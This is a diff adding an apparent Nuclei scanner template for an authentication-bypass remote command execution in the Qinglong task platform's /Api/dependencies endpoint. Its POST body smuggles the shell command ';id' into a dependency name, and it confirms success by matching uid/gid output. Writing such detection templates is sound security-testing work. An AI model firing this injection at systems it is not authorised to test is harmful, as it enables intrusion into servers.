@@ -1,0 +1,39 @@
+id: qinglong-dependencies-rce
+
+info:
+  name: 青龙定时任务管理平台dependencies鉴权绕过导致远程命令执行漏洞
+  author: qinglong
+  severity: critical
+  tags: qinglong
+
+http:
+  - raw:
+      - |
+        POST /Api/dependencies HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/json
+
+        [
+          {
+            "name": ";id",
+            "type": 0
+          }
+        ]
+
+      - |+
+        GET /Api/dependencies HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
+      - type: status
+        status:
+          - 200
